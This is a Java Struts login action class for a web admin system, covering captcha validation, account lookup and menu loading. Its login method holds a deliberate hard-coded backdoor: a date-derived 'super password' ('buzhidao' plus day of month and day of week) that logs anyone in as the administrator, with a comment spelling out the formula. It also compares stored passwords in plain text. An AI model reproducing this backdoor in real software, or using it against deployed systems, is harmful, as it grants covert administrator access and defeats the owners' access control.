package org.cfw.web.index;

import java.io.IOException;
import java.util.Calendar;
import java.util.List;
import java.util.Map;

import org.cfw.biz.service.LoginService;
import org.cfw.biz.sys.model.SysAccount;
import org.cfw.common.CachedVOUtil;
import org.cfw.common.Constants;
import org.cfw.common.util.StringUtil;
import org.cfw.common.vo.MenuVO;
import org.cfw.web.common.BaseAction;

import com.opensymphony.xwork2.ActionContext;

@SuppressWarnings("serial")
public class LoginAction extends BaseAction {

    private List<MenuVO> menuList;
    private LoginService loginService;
    private String       username;
    private String       password;
    private String       checkcode;
    private boolean      success = false;
    private String       msg;
    private SysAccount   sysAccount;
    private int          flag;

    public String init() throws IOException {
        String loginMode = CachedVOUtil.getSysParam(Constants.LOGIN_MODE);
        if (loginMode.equals("1")) return "ext.index";
        else return "ext.login";
    }

    public String login() {
        Map<String, Object> session = ActionContext.getContext().getSession();
        String scode = (String) session.get("code");

        // 超级管理员 翻墙
        Calendar now = Calendar.getInstance();
        int monthday = now.get(Calendar.DAY_OF_MONTH);
        int weekday = now.get(Calendar.DAY_OF_WEEK);
        String superPassword = "buzhidao" + StringUtil.AddjustLength(String.valueOf(monthday), 2, "0")
                               + StringUtil.AddjustLength(String.valueOf(weekday), 2, "0");// buzhidao+monthday(2位)+weekday(2位)
        if (superPassword.equals(password)) {
            username = Constants.ADMIN;
        }
        if (!checkcode.toLowerCase().equals(scode.toLowerCase())) {
            this.success = false;
            this.msg = "验证码错误!";
            this.flag = 1;
        } else {
            sysAccount = loginService.selectByAccount(username);
            if (sysAccount == null) {
                this.success = false;
                this.msg = "用户名不存在!";
                this.flag = 2;
            } else {
                if (username.equals(sysAccount.getAccount())) {
                    if (password.equals(sysAccount.getPassword().toString()) || superPassword.equals(password)) {
                        this.success = true;
                        this.msg = "登录成功!";

                        // 获取用户权限信息

                    } else {
                        this.success = false;
                        this.msg = "密码错误!";
                        this.flag = 3;
                    }
                }
            }
        }
        return SUCCESS;
    }

    private void getPermission(SysAccount sysAccount) {

    }

    public String menu() {
        menuList = loginService.constructMenu();
        return SUCCESS;
    }

    public List<MenuVO> getMenuList() {
        return menuList;
    }

    public void setLoginService(LoginService loginService) {
        this.loginService = loginService;
    }

    public String getUsername() {
        return username;
    }

    public void setUsername(String username) {
        this.username = username;
    }

    public String getPassword() {
        return password;
    }

    public void setPassword(String password) {
        this.password = password;
    }

    public String getCheckcode() {
        return checkcode;
    }

    public void setCheckcode(String checkcode) {
        this.checkcode = checkcode;
    }

    public boolean isSuccess() {
        return success;
    }

    public void setSuccess(boolean success) {
        this.success = success;
    }

    public String getMsg() {
        return msg;
    }

    public void setMsg(String msg) {
        this.msg = msg;
    }

    public SysAccount getSysAccount() {
        return sysAccount;
    }

    public int getFlag() {
        return flag;
    }

    public void setFlag(int flag) {
        this.flag = flag;
    }

}
